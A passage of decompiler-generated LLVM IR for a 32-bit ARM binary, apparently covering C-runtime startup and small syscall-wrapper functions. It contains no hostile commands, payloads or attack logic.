  %v2_1384c = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 124804, i32* @r6, align 4
  %v3_13858 = mul i32 %arg2, 4
  store i32 %v3_13858, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_13860 = load i32, i32* inttoptr (i32 124824 to i32*), align 8
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_13868 = ptrtoint i32* %stack_var_-120 to i32
  %v4_1386c = load i32, i32* inttoptr (i32 124832 to i32*), align 32
  store i32 %v4_1386c, i32* %r4.global-to-local, align 4
  %v2_13874 = add i32 %v1_13848, %v3_13858
  store i32 %v2_13874, i32* %ip.global-to-local, align 4
  %v9_13878 = icmp eq i32 %v2_13874, %v2_1384c
  store i1 %v9_13878, i1* %cpsr_z.global-to-local, align 1
  %v2_1387c = inttoptr i32 %v4_13860 to i32*
  store i32 %arg7, i32* %v2_1387c, align 4
  store i32 688, i32* %r2.global-to-local, align 4
  %v0_13888 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_13878, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_13840
  %v1_1388c = load i32, i32* @r7, align 4
  %v2_1388c = load i32, i32* %r5.global-to-local, align 4
  %v3_1388c = add i32 %v2_1388c, %v1_1388c
  store i32 %v3_1388c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_1ea34.456, align 4
  %v0_13894 = load i32, i32* %ip.global-to-local, align 4
  %v1_13894 = load i32, i32* %r4.global-to-local, align 4
  %v2_13894 = inttoptr i32 %v1_13894 to i32*
  store i32 %v0_13894, i32* %v2_13894, align 4
  store i32 120, i32* @r2, align 4
  %v1_138a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_138a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_138a0 = inttoptr i32 %v2_138a0 to i32*
  store i32 %v1_138a0, i32* %v3_138a0, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_13840
  store i32 %arg6, i32* @global_var_1ea34.456, align 4
  %v0_13894.c = load i32, i32* %ip.global-to-local, align 4
  %v1_13894.c = load i32, i32* %r4.global-to-local, align 4
  %v2_13894.c = inttoptr i32 %v1_13894.c to i32*
  store i32 %v0_13894.c, i32* %v2_13894.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  %v2_138ac = bitcast i32* %stack_var_-120 to i8*
  %v3_138ac = call i32 @function_11250(i8* %v2_138ac, i32 0)
  %v0_138b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_138b0 = inttoptr i32 %v0_138b0 to i32*
  %storemerge.pre = load i32, i32* %v1_138b0, align 4
  br label %dec_label_pc_138bc

dec_label_pc_138bc:                               ; preds = %dec_label_pc_138bc, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_138bc, %dec_label_pc_138bc ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_138bc = inttoptr i32 %storemerge to i32*
  %v2_138bc = load i32, i32* %v1_138bc, align 4
  store i32 %v2_138bc, i32* %r3.global-to-local, align 4
  %v4_138bc = add i32 %storemerge, 4
  store i32 %v4_138bc, i32* %r2.global-to-local, align 4
  %v2_138c0 = icmp eq i32 %v2_138bc, 0
  br i1 %v2_138c0, label %dec_label_pc_138cc, label %dec_label_pc_138bc

dec_label_pc_138cc:                               ; preds = %dec_label_pc_138bc
  store i32 %v4_138bc, i32* @r4, align 4
  store i32 %v2_13868, i32* @r5, align 4
  %v1_138f029 = inttoptr i32 %v4_138bc to i32*
  %v2_138f030 = load i32, i32* %v1_138f029, align 4
  store i32 %v2_138f030, i32* %r3.global-to-local, align 4
  %v2_138f432 = icmp eq i32 %v2_138f030, 0
  store i1 %v2_138f432, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_138f432, label %dec_label_pc_138fc, label %dec_label_pc_138d8

dec_label_pc_138d8:                               ; preds = %dec_label_pc_138cc, %dec_label_pc_138f0
  %v5_138dc = phi i32 [ %v2_138f0, %dec_label_pc_138f0 ], [ %v2_138f030, %dec_label_pc_138cc ]
  %v2_138d8 = icmp ugt i32 %v5_138dc, 13
  %v7_138d8 = icmp eq i32 %v5_138dc, 14
  store i1 %v7_138d8, i1* %cpsr_z.global-to-local, align 1
  %v2_138dc = xor i1 %v2_138d8, true
  %v3_138dc = or i1 %v7_138d8, %v2_138dc
  br i1 %v3_138dc, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_138d8
  %v6_138dc = and i32 %v5_138dc, 536870912
  %v7_138dc = icmp ne i32 %v6_138dc, 0
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_138d8, %bb58
  %v1_138e8 = phi i1 [ %v2_138d8, %dec_label_pc_138d8 ], [ %v7_138dc, %bb58 ]
  %v2_138e0 = xor i1 %v1_138e8, true
  %v3_138e0 = or i1 %v7_138d8, %v2_138e0
  br i1 %v3_138e0, label %bb60, label %dec_label_pc_138f0

bb60:                                             ; preds = %bb59
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_138f0

dec_label_pc_138f0:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_138e0, i32 ptrtoint (i32* @global_var_11300.470 to i32))
  %v0_138ec = load i32, i32* @r4, align 4
  %v1_138ec = add i32 %v0_138ec, 8
  store i32 %v1_138ec, i32* @r4, align 4
  %v1_138f0 = inttoptr i32 %v1_138ec to i32*
  %v2_138f0 = load i32, i32* %v1_138f0, align 4
  store i32 %v2_138f0, i32* %r3.global-to-local, align 4
  %v2_138f4 = icmp eq i32 %v2_138f0, 0
  store i1 %v2_138f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_138f4, label %dec_label_pc_138fc, label %dec_label_pc_138d8

dec_label_pc_138fc:                               ; preds = %dec_label_pc_138f0, %dec_label_pc_138cc
  %v1_13900 = call i32 @function_15d04(i32 %v2_13868)
  store i32 %v1_13900, i32* @r0, align 4
  %v1_13904 = call i32 @function_137d4(i32 %v1_13900)
  store i32 %v1_13904, i32* @r0, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_13910 = load i32, i32* @r6, align 4
  %v2_13910 = add i32 %v0_13910, 92
  %v3_13910 = inttoptr i32 %v2_13910 to i32*
  %v4_13910 = load i32, i32* %v3_13910, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_13918 = icmp eq i32 %tmp53, 0
  store i1 %v2_13918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13918, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_138fc
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_138fc, %bb61
  %v0_13924 = phi i32 [ %tmp53, %dec_label_pc_138fc ], [ 4096, %bb61 ]
  %v3_13920 = icmp eq i32 %tmp52, -1
  %v8_13920 = icmp eq i32 %tmp52, -1
  store i1 %v8_13920, i1* %cpsr_z.global-to-local, align 1
  %v2_13924 = inttoptr i32 %v4_13910 to i32*
  store i32 %v0_13924, i32* %v2_13924, align 4
  br i1 %v3_13920, label %dec_label_pc_1392c, label %dec_label_pc_13954

dec_label_pc_1392c:                               ; preds = %bb62
  %v0_1392c = call i32 @function_13c44()
  store i32 %v0_1392c, i32* @r0, align 4
  store i32 %v0_1392c, i32* @r4, align 4
  %v0_13934 = call i32 @function_13ca0()
  store i32 %v0_13934, i32* @r0, align 4
  %v0_13938 = load i32, i32* @r4, align 4
  %v9_13938 = icmp eq i32 %v0_13938, %v0_13934
  store i1 %v9_13938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13938, label %dec_label_pc_13940, label %dec_label_pc_1397c

dec_label_pc_13940:                               ; preds = %dec_label_pc_1392c
  %v1_13940 = call i32 @function_13e0c(i32 %v0_13934)
  store i32 %v1_13940, i32* @r0, align 4
  store i32 %v1_13940, i32* @r4, align 4
  %v0_13948 = call i32 @function_13c8c()
  store i32 %v0_13948, i32* @r0, align 4
  %v0_1394c = load i32, i32* @r4, align 4
  %v9_1394c = icmp eq i32 %v0_1394c, %v0_13948
  store i1 %v9_1394c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1394c, label %dec_label_pc_13954, label %dec_label_pc_1397c

dec_label_pc_13954:                               ; preds = %dec_label_pc_13940, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_13920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_13920, label %dec_label_pc_139a0, label %dec_label_pc_13960

dec_label_pc_13960:                               ; preds = %dec_label_pc_13954
  store i32 %tmp51, i32* @r3, align 4
  %v9_13964 = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_13964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13964, label %dec_label_pc_1396c, label %dec_label_pc_1397c

dec_label_pc_1396c:                               ; preds = %dec_label_pc_13960
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_13974 = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_13974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13974, label %dec_label_pc_139a0, label %dec_label_pc_1397c

dec_label_pc_1397c:                               ; preds = %dec_label_pc_13960, %dec_label_pc_13940, %dec_label_pc_1392c, %dec_label_pc_1396c
  %v2_13984 = call i32 @function_13780(i32 0, i32 32768)
  %v2_13990 = call i32 @function_13780(i32 1, i32 32770)
  %v2_1399c = call i32 @function_13780(i32 2, i32 32770)
  store i32 %v2_1399c, i32* @r0, align 4
  br label %dec_label_pc_139a0

dec_label_pc_139a0:                               ; preds = %dec_label_pc_1396c, %dec_label_pc_13954, %dec_label_pc_1397c
  %v0_139a0 = load i32, i32* @r7, align 4
  %v1_139a0 = inttoptr i32 %v0_139a0 to i32*
  %v2_139a0 = load i32, i32* %v1_139a0, align 4
  store i32 %v2_139a0, i32* %r2.global-to-local, align 4
  store i32 208, i32* %r3.global-to-local, align 4
  %v1_139a8 = load i32, i32* @r6, align 4
  %v3_139a8 = add i32 %v1_139a8, 208
  %v4_139a8 = inttoptr i32 %v3_139a8 to i32*
  store i32 %v2_139a0, i32* %v4_139a8, align 4
  %v0_139ac = load i32, i32* @r7, align 4
  %v1_139ac = inttoptr i32 %v0_139ac to i32*
  %v2_139ac = load i32, i32* %v1_139ac, align 4
  store i32 %v2_139ac, i32* @r4, align 4
  %v2_139b0 = icmp eq i32 %v2_139ac, 0
  store i1 %v2_139b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_139b0, label %dec_label_pc_13a54.lr.ph, label %dec_label_pc_139b8

dec_label_pc_139b8:                               ; preds = %dec_label_pc_139a0
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_139bc = load i32, i32* @r6, align 4
  %v2_139bc = add i32 %v0_139bc, 112
  %v3_139bc = inttoptr i32 %v2_139bc to i32*
  %v4_139bc = load i32, i32* %v3_139bc, align 4
  store i32 %v4_139bc, i32* %r3.global-to-local, align 4
  %v2_139c0 = inttoptr i32 %v4_139bc to i32*
  store i32 %v2_139ac, i32* %v2_139c0, align 4
  %v0_139c8 = load i32, i32* @r7, align 4
  %v1_139c8 = inttoptr i32 %v0_139c8 to i32*
  %v2_139c8 = load i32, i32* %v1_139c8, align 4
  %v4_139cc = call i32 @function_15940(i32 %v2_139c8, i32 47, i32 %v2_139a0, i32 %v4_139bc)
  store i32 %v4_139cc, i32* @r0, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_139d4 = icmp eq i32 %v4_139cc, 0
  store i1 %v2_139d4, i1* %cpsr_z.global-to-local, align 1
  %v0_139d8 = load i32, i32* @r6, align 4
  %v2_139d8 = add i32 %v0_139d8, 60
  %v3_139d8 = inttoptr i32 %v2_139d8 to i32*
  %v4_139d8 = load i32, i32* %v3_139d8, align 4
  store i32 %v4_139d8, i32* %r2.global-to-local, align 4
  br i1 %v2_139d4, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_139b8
  %v2_139e047 = inttoptr i32 %v4_139d8 to i32*
  store i32 0, i32* %v2_139e047, align 4
  br label %dec_label_pc_13a54.lr.ph

bb63:                                             ; preds = %dec_label_pc_139b8
  %v2_139dc = add i32 %v4_139cc, 1
  store i32 %v2_139dc, i32* %r3.global-to-local, align 4
  %v2_139e0 = inttoptr i32 %v4_139d8 to i32*
  store i32 %v4_139cc, i32* %v2_139e0, align 4
  %v1_139e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_139e4 = load i32, i32* %r2.global-to-local, align 4
  %v3_139e4 = inttoptr i32 %v2_139e4 to i32*
  store i32 %v1_139e4, i32* %v3_139e4, align 4
  br label %dec_label_pc_13a54.lr.ph

dec_label_pc_13a54.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_139a0
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_139fc = load i32, i32* @r6, align 4
  %v2_139fc = add i32 %v0_139fc, -12
  store i32 %v2_139fc, i32* %r8.global-to-local, align 4
  store i32 684, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_1ea30.454, align 4
  %v2_13a2c = icmp eq i32 %v0_13888, 0
  store i1 %v2_13a2c, i1* %cpsr_z.global-to-local, align 1
  %v2_13a34 = xor i1 %v2_13a2c, true
  call void @__pseudo_cond_branch(i1 %v2_13a34, i32 %v0_13888)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_13a48 = load i32, i32* @r6, align 4
  %v2_13a48 = add i32 %v0_13a48, -12
  store i32 %v2_13a48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13a54

dec_label_pc_13a54:                               ; preds = %dec_label_pc_13a54.dec_label_pc_13a54_crit_edge, %dec_label_pc_13a54.lr.ph
  %v1_13a54 = phi i32 [ %v1_13a60, %dec_label_pc_13a54.dec_label_pc_13a54_crit_edge ], [ 0, %dec_label_pc_13a54.lr.ph ]
  %v0_13a54 = phi i32 [ %v0_13a54.pre, %dec_label_pc_13a54.dec_label_pc_13a54_crit_edge ], [ %v2_13a48, %dec_label_pc_13a54.lr.ph ]
  %v4_13a54 = mul i32 %v1_13a54, 4
  %v5_13a54 = add i32 %v4_13a54, %v0_13a54
  %v6_13a54 = inttoptr i32 %v5_13a54 to i32*
  %v7_13a54 = load i32, i32* %v6_13a54, align 4
  store i32 %v7_13a54, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_13a54)
  %v0_13a60 = load i32, i32* %r4.global-to-local, align 4
  %v1_13a60 = add i32 %v0_13a60, 1
  store i32 %v1_13a60, i32* %r4.global-to-local, align 4
  %v1_13a64 = load i32, i32* %r5.global-to-local, align 4
  %v3_13a64 = icmp ult i32 %v1_13a60, %v1_13a64
  %v9_13a64 = icmp eq i32 %v1_13a60, %v1_13a64
  store i1 %v9_13a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13a64, label %dec_label_pc_13a54.dec_label_pc_13a54_crit_edge, label %dec_label_pc_13a6c

dec_label_pc_13a54.dec_label_pc_13a54_crit_edge:  ; preds = %dec_label_pc_13a54
  %v0_13a54.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13a54

dec_label_pc_13a6c:                               ; preds = %dec_label_pc_13a54
  %v0_13a70.pre = load i32, i32* @r6, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_13a70 = add i32 %v0_13a70.pre, 104
  %v3_13a70 = inttoptr i32 %v2_13a70 to i32*
  %v4_13a70 = load i32, i32* %v3_13a70, align 4
  store i32 %v4_13a70, i32* %r2.global-to-local, align 4
  store i32 %v4_13a70, i32* %r3.global-to-local, align 4
  %v2_13a78 = icmp eq i32 %v4_13a70, 0
  store i1 %v2_13a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13a78, label %dec_label_pc_13a90, label %dec_label_pc_13a80

dec_label_pc_13a80:                               ; preds = %dec_label_pc_13a6c
  call void @__pseudo_branch(i32 %v4_13a70)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13a8c = load i32, i32* @r0, align 4
  %v2_13a8c = inttoptr i32 %v1_13a8c to i32*
  store i32 0, i32* %v2_13a8c, align 4
  %v0_13a94.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13a90

dec_label_pc_13a90:                               ; preds = %dec_label_pc_13a6c, %dec_label_pc_13a80
  %v0_13a94 = phi i32 [ %v0_13a70.pre, %dec_label_pc_13a6c ], [ %v0_13a94.pre, %dec_label_pc_13a80 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_13a94 = add i32 %v0_13a94, 80
  %v3_13a94 = inttoptr i32 %v2_13a94 to i32*
  %v4_13a94 = load i32, i32* %v3_13a94, align 4
  store i32 %v4_13a94, i32* %r2.global-to-local, align 4
  store i32 %v4_13a94, i32* %r3.global-to-local, align 4
  %v2_13a9c = icmp eq i32 %v4_13a94, 0
  store i1 %v2_13a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13a9c, label %dec_label_pc_13ab4, label %dec_label_pc_13aa4

dec_label_pc_13aa4:                               ; preds = %dec_label_pc_13a90
  call void @__pseudo_branch(i32 %v4_13a94)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13ab0 = load i32, i32* @r0, align 4
  %v2_13ab0 = inttoptr i32 %v1_13ab0 to i32*
  store i32 0, i32* %v2_13ab0, align 4
  %v0_13ab8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ab4

dec_label_pc_13ab4:                               ; preds = %dec_label_pc_13a90, %dec_label_pc_13aa4
  %v0_13ab8 = phi i32 [ %v0_13a94, %dec_label_pc_13a90 ], [ %v0_13ab8.pre, %dec_label_pc_13aa4 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_13ab8 = add i32 %v0_13ab8, 28
  %v3_13ab8 = inttoptr i32 %v2_13ab8 to i32*
  %v4_13ab8 = load i32, i32* %v3_13ab8, align 4
  store i32 %v4_13ab8, i32* %r3.global-to-local, align 4
  %v1_13ac0 = inttoptr i32 %v4_13ab8 to i32*
  %v2_13ac0 = load i32, i32* %v1_13ac0, align 4
  store i32 %v2_13ac0, i32* %r2.global-to-local, align 4
  %v0_13ac4 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_13ad0 = call i32 @function_12e38(i32 %v0_13ac4)
  %v0_13ad4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13ad4, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_13ab4
  %v2_13ad8 = load i32, i32* %r4.global-to-local, align 4
  %v8_13ad8 = shl i32 %v2_13ad8, %v1_13ad0
  %v9_13ad8 = and i32 %v8_13ad8, %v1_13ad0
  %v2_13adc = load i32, i32* %ip.global-to-local, align 4
  %v8_13adc = shl i32 %v2_13adc, %v9_13ad8
  %v9_13adc = and i32 %v8_13adc, %v9_13ad8
  %v2_13ae0 = trunc i32 %v9_13adc to i16
  %v4_13ae0 = inttoptr i32 %v9_13adc to i16*
  store i16 %v2_13ae0, i16* %v4_13ae0, align 2
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13ab4, %bb64
  %v10_13af4 = phi i32 [ %v1_13ad0, %dec_label_pc_13ab4 ], [ 0, %bb64 ]
  ret i32 %v10_13af4

; uselistorder directives
  uselistorder i32 %v9_13adc, { 1, 0 }
  uselistorder i32 %v1_13ad0, { 1, 0, 2 }
  uselistorder i32 %v0_13a70.pre, { 1, 0 }
  uselistorder i32 %v1_13a64, { 1, 0 }
  uselistorder i32 %v1_13a60, { 3, 2, 1, 0 }
  uselistorder i32 %v4_139d8, { 1, 0, 2 }
  uselistorder i1 %v8_13920, { 1, 2, 0 }
  uselistorder i32 %v2_138f0, { 1, 2, 0 }
  uselistorder i1 %v2_138d8, { 1, 0 }
  uselistorder i32 %v4_138bc, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_13888, { 1, 0 }
  uselistorder i32 %v3_13858, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 15, 16, 17, 18, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 0, 12, 13, 14, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 8, 4, 1, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 17, 16, 0, 18 }
  uselistorder i32 (i32)* @function_12e38, { 0, 6, 7, 5, 4, 3, 2, 1 }
  uselistorder i32 47, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @function_13780, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 0, 1 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_13ab4, { 1, 0 }
  uselistorder label %dec_label_pc_13a90, { 1, 0 }
  uselistorder label %dec_label_pc_13a54.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1397c, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_138f0, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_138d8, { 1, 0 }
}

define i32 @function_13b14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13b14:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13b14 = load i32, i32* @r4, align 4
  store i32 %v3_13b14, i32* %stack_var_-16, align 4
  %v3_13b20 = urem i32 %arg3, 4096
  %v2_13b24 = icmp eq i32 %v3_13b20, 0
  br i1 %v2_13b24, label %dec_label_pc_13b40, label %dec_label_pc_13b2c

dec_label_pc_13b2c:                               ; preds = %dec_label_pc_13b14
  %v0_13b2c = call i32 @function_11200()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13b38 = inttoptr i32 %v0_13b2c to i32*
  store i32 22, i32* %v2_13b38, align 4
  %v0_13b70.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b70

dec_label_pc_13b40:                               ; preds = %dec_label_pc_13b14
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13b6c, label %dec_label_pc_13b5c

dec_label_pc_13b5c:                               ; preds = %dec_label_pc_13b40
  %v0_13b5c = call i32 @function_11200()
  %v0_13b60 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b60 = sub i32 0, %v0_13b60
  %v2_13b64 = inttoptr i32 %v0_13b5c to i32*
  store i32 %v1_13b60, i32* %v2_13b64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b6c

dec_label_pc_13b6c:                               ; preds = %dec_label_pc_13b40, %dec_label_pc_13b5c
  %v0_13b6c = phi i32 [ %arg1, %dec_label_pc_13b40 ], [ -1, %dec_label_pc_13b5c ]
  store i32 %v0_13b6c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b70

dec_label_pc_13b70:                               ; preds = %dec_label_pc_13b2c, %dec_label_pc_13b6c
  %v0_13b70 = phi i32 [ %v0_13b70.pre, %dec_label_pc_13b2c ], [ %v0_13b6c, %dec_label_pc_13b6c ]
  %v2_13b74 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13b74, i32* @r4, align 4
  ret i32 %v0_13b70

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b70, { 1, 0 }
  uselistorder label %dec_label_pc_13b6c, { 1, 0 }
}

define i32 @function_13b7c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13b7c:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13b7c = load i32, i32* @r4, align 4
  %v6_13b7c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_13b84 = icmp eq i32 %arg2, 0
  store i32 124804, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_13b84, label %dec_label_pc_13bd8, label %dec_label_pc_13b9c

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b7c
  %v1_13b9c = add i32 %arg2, 4
  %v2_13b9c = inttoptr i32 %v1_13b9c to i32*
  %v3_13b9c = load i32, i32* %v2_13b9c, align 4
  store i32 %v3_13b9c, i32* @r3, align 4
  %v1_13ba0 = and i32 %v3_13b9c, 67108864
  %v2_13ba0 = icmp eq i32 %v1_13ba0, 0
  br i1 %v2_13ba0, label %dec_label_pc_13ba8, label %dec_label_pc_13bd8

dec_label_pc_13ba8:                               ; preds = %dec_label_pc_13b9c
  store i32 20, i32* @r2, align 4
  %v2_13bac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13bac, i32* @r0, align 4
  %v0_13bb0 = call i32 @function_11300()
  store i32 %v2_13bac, i32* @ip, align 4
  %v0_13bd8.pre = load i32, i32* @r5, align 4
  %v0_13be0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13b9c, %dec_label_pc_13b7c, %dec_label_pc_13ba8
  %v0_13be0 = phi i32 [ %arg3, %dec_label_pc_13b9c ], [ %arg3, %dec_label_pc_13b7c ], [ %v0_13be0.pre, %dec_label_pc_13ba8 ]
  %v0_13bdc = phi i32 [ %arg2, %dec_label_pc_13b9c ], [ 0, %dec_label_pc_13b7c ], [ %v2_13bac, %dec_label_pc_13ba8 ]
  %v0_13bd8 = phi i32 [ %arg1, %dec_label_pc_13b9c ], [ %arg1, %dec_label_pc_13b7c ], [ %v0_13bd8.pre, %dec_label_pc_13ba8 ]
  %v4_13be8 = call i32 @function_14138(i32 %v0_13bd8, i32 %v0_13bdc, i32 %v0_13be0, i32 8)
  store i32 %v3_13b7c, i32* @r4, align 4
  store i32 %v6_13b7c, i32* @r5, align 4
  ret i32 %v4_13be8

; uselistorder directives
  uselistorder label %dec_label_pc_13bd8, { 2, 0, 1 }
}

define i32 @function_13bfc(i32 %arg1) local_unnamed_addr {
dec_label_pc_13bfc:
  %v0_13bfc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13bfc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13bfc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13bfc, %bb
  %v0_13c10 = phi i32 [ %arg1, %dec_label_pc_13bfc ], [ 0, %bb ]
  ret i32 %v0_13c10

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13c1c() local_unnamed_addr {
dec_label_pc_13c1c:
  %v4_13c28 = load i32, i32* inttoptr (i32 124896 to i32*), align 32
  %v1_13c2c = inttoptr i32 %v4_13c28 to i32*
  %v2_13c2c = load i32, i32* %v1_13c2c, align 4
  %v2_13c30 = icmp eq i32 %v2_13c2c, 0
  br i1 %v2_13c30, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13c1c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13c1c, %bb
  %v1_13c38 = phi i32 [ %v2_13c2c, %dec_label_pc_13c1c ], [ 4096, %bb ]
  ret i32 %v1_13c38

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_13c44() local_unnamed_addr {
dec_label_pc_13c44:
  %v1_13c54 = load i32, i32* @r0, align 4
  ret i32 %v1_13c54
}

define i32 @function_13c58(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c58:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c58 = load i32, i32* @r7, align 4
  store i32 %v3_13c58, i32* %stack_var_-8, align 4
  %v0_13c64 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13c64, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13c64, -4095
  br i1 %tmp, label %dec_label_pc_13c84, label %dec_label_pc_13c74

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c58
  %v0_13c74 = call i32 @function_11200()
  %v0_13c78 = load i32, i32* %r7.global-to-local, align 4
  %v1_13c78 = sub i32 0, %v0_13c78
  %v2_13c7c = inttoptr i32 %v0_13c74 to i32*
  store i32 %v1_13c78, i32* %v2_13c7c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13c84.pre = load i32, i32* %stack_var_-8, align 4
